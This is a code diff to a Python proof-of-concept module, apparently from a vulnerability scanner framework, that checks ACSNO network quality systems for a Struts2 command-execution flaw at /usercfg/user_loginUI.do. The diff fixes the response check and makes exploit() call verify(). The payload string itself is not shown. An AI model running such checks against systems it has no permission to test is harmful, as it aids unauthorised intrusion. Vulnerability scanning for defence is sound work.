@@ -13,11 +13,11 @@ class Vuln(ABVuln):
         埃森诺网络服务质量检测系统 Struts2 命令执行。
         /usercfg/user_loginUI.do
     '''  # 漏洞描述
-    ref = ''  # 漏洞来源
-    cnvd_id = ''  # cnvd漏洞编号
-    cve_id = ''  # cve编号
+    ref = 'Unkonwn'  # 漏洞来源
+    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
+    cve_id = 'Unkonwn'  # cve编号
     product = 'ACSNO(埃森诺)'  # 漏洞应用名称
-    product_version = ''  # 漏洞应用版本
+    product_version = 'Unkonwn'  # 漏洞应用版本
 
 class Poc(ABPoc):
     poc_id = '8f26924e-f7b5-4a28-99eb-8d4693eca404'
@@ -39,7 +39,7 @@ class Poc(ABPoc):
             url = arg + param_data
             r = requests.get(url)
             
-            if 'Useage' and 'Whoami' and 'WebPath' in r.content:
+            if 'Useage' in r.content and 'Whoami' in r.content and 'WebPath' in r.content:
             #task_push('struts' ,url)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -48,7 +48,7 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        super(Poc, self).exploit()
+        self.verify()
 
 if __name__ == '__main__':
     Poc().run()
